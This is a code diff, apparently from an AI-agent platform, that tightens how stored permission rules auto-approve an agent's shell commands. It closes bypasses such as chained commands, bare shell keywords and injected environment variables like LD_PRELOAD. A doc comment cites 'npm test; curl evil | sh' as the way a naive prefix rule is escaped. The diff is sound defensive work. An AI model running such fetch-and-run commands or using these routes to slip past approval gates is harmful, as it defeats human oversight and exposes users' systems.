@@ -1,8 +1,9 @@
 import {
   AgentProvider,
   bashPrefix,
-  bashSegments,
+  isBashCommandKeyword,
   isBashShellWrapperPrefix,
+  readableBashSegments,
 } from '@orbit/shared';
 import type { PermissionRule } from '@orbit/shared';
 
@@ -49,13 +50,11 @@ export function normalizePermissionRule(
   if (ruleContent.length > MAX_RULE_LEN || !narrowsOneGrant(ruleContent)) return null;
   // `/bin/bash:*` is a wrapper-wide grant, not a command-specific grant. It can be left behind
   // by an older client that derived a rule from Codex's raw `/bin/bash -lc …` command, so drop it
-  // at every server boundary rather than letting a stale row suppress future approvals.
-  if (
-    SHELL_TOOLS.has(toolName) &&
-    ruleContent.endsWith(':*') &&
-    isBashShellWrapperPrefix(ruleContent.slice(0, -2))
-  ) {
-    return null;
+  // at every server boundary rather than letting a stale row suppress future approvals. A bare shell
+  // keyword is the same grant by another route: `do:*` covers every command a loop runs.
+  if (SHELL_TOOLS.has(toolName) && ruleContent.endsWith(':*')) {
+    const prefix = ruleContent.slice(0, -2);
+    if (isBashShellWrapperPrefix(prefix) || isBashCommandKeyword(prefix)) return null;
   }
   return { toolName, ruleContent };
 }
@@ -205,18 +204,20 @@ function bashRulePrefixes(rules: readonly StoredPermissionRule[]): string[] {
  * this and a prefix match: `npm test` alone is covered, but `npm test; curl evil | sh` is not,
  * even though it starts with an approved prefix — which is precisely how a naive prefix rule is
  * escaped. The line is split with the same quote-aware splitter that DERIVED the rules from an
- * approved command, so "covered" means the same thing at both ends of a rule's life.
+ * approved command, so "covered" means the same thing at both ends of a rule's life, and a line
+ * it cannot read for certain is not covered at all (`readableBashSegments`).
  */
 function commandCovered(command: string, rules: readonly StoredPermissionRule[]): boolean {
-  const trimmed = command.trim();
-  if (!trimmed) return false;
   const prefixes = bashRulePrefixes(rules);
   if (prefixes.length === 0) return false;
-  const segments = bashSegments(trimmed);
-  if (segments.length === 0) return false;
+  const segments = readableBashSegments(command);
+  if (!segments) return false;
   return segments.every((segment) => {
     const text = segment.trim();
     if (!text) return false;
+    // A keyword on a line of its own runs nothing, and no rule can name one. What it leads to is
+    // the next sub-command, judged like any other.
+    if (isBashCommandKeyword(text)) return true;
     if (UNREADABLE_SHELL_SYNTAX.some((syntax) => text.includes(syntax))) return false;
     const commandPrefix = bashPrefix(text);
     if (!commandPrefix) return false;
@@ -224,10 +225,17 @@ function commandCovered(command: string, rules: readonly StoredPermissionRule[])
   });
 }
 
-/** The command line an approval is asking about, or '' when it isn't asking about one. */
+/**
+ * The command line an approval is asking about, or '' when it isn't asking about one, or when the
+ * call also sets variables for it. A rule names a command, and `env` can change what that command is
+ * (`PATH`), what it loads (`LD_PRELOAD`, `BASH_ENV`) or what it does; nobody has ruled on those values.
+ */
 function approvalCommand(input: unknown): string {
   if (!input || typeof input !== 'object') return '';
-  const command = (input as { command?: unknown }).command;
+  const { command, env } = input as { command?: unknown; env?: unknown };
+  if (env !== undefined && env !== null) {
+    if (typeof env !== 'object' || Object.keys(env).length > 0) return '';
+  }
   return typeof command === 'string' ? command : '';
 }
 
@@ -248,6 +256,21 @@ export function ruleCoversApproval(
   rules: readonly PermissionRule[],
 ): boolean {
   if (!SERVER_MATCHED_RUNTIMES.has(provider) || !toolName) return false;
+  return rulesAnswerCall(toolName, input, rules);
+}
+
+/**
+ * Whether the workspace's rules answer the card the runner's gate files for a background job
+ * (runner-go background_gate.go). The same reading of the same rules as `ruleCoversApproval`, on every
+ * runtime: its question came from the runner rather than from an engine, so no engine's matcher has
+ * seen it, Claude's and the runtimes' that ask nothing themselves included, and no matcher but this one
+ * ever will.
+ */
+export function ruleCoversBackgroundJobCard(input: unknown, rules: readonly PermissionRule[]): boolean {
+  return rulesAnswerCall('Bash', input, rules);
+}
+
+function rulesAnswerCall(toolName: string, input: unknown, rules: readonly PermissionRule[]): boolean {
   const stored = normalizePermissionRules(rules);
   if (stored.length === 0) return false;
   if (SHELL_TOOLS.has(toolName)) {
